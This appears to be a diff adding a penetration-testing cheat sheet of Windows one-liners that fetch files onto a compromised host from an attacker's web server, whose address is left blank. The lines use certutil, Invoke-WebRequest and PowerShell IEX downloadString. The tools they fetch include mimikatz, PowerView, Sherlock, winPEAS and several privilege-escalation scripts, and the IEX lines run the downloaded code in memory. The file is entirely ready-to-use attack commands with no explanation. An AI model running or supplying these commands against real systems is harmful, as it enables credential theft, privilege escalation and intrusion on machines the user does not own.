@@ -1,0 +1,26 @@
+
+CERTUTIL
+certutil.exe -urlcache -split -f http://:80/﻿birbakwin.bat birbakwin.bat
+certutil.exe -urlcache -split -f http://:80/﻿mimikatz.exe mimikatz.exe
+certutil.exe -urlcache -split -f http://:80/﻿powerview.ps1 powerview.ps1
+certutil.exe -urlcache -split -f http://:80/﻿Sherlock.ps1 Sherlock.ps1
+certutil.exe -urlcache -split -f http://:80/﻿windowsenum2.ps1 windowsenum2.ps1
+certutil.exe -urlcache -split -f http://:80/﻿windowsenum.ps1 windowsenum.ps1
+certutil.exe -urlcache -split -f http://:80/﻿winPEAS.bat winPEAS.bat
+certutil.exe -urlcache -split -f http://:80/﻿winprivesc.bat winprivesc.bat
+
+IEX
+powershell "IEX(New-Object Net.WebClient).downloadString('http://:80/powerview.ps1')"
+powershell "IEX(New-Object Net.WebClient).downloadString('http://:80/Sherlock.ps1')"
+powershell "IEX(New-Object Net.WebClient).downloadString('http://:80/windowsenum2.ps1')"
+powershell "IEX(New-Object Net.WebClient).downloadString('http://:80/windowsenum.ps1')"
+
+IWR
+powershell iwr http://:80/birbakwin.bat -outfile c:temp\birbakwin.bat
+powershell iwr http://:80/mimikatz.exe -outfile c:temp\mimikatz.exe
+powershell iwr http://:80/powerview.ps1 -outfile c:temp\powerview.ps1
+powershell iwr http://:80/Sherlock.ps1 -outfile c:temp\Sherlock.ps1
+powershell iwr http://:80/windowsenum2.ps1 -outfile c:temp\windowsenum2.ps1
+powershell iwr http://:80/windowsenum.ps1 -outfile c:temp\windowsenum.ps1
+powershell iwr http://:80/winPEAS.bat -outfile c:temp\winPEAS.bat
+powershell iwr http://:80/winprivesc.bat -outfile c:temp\winprivesc.bat
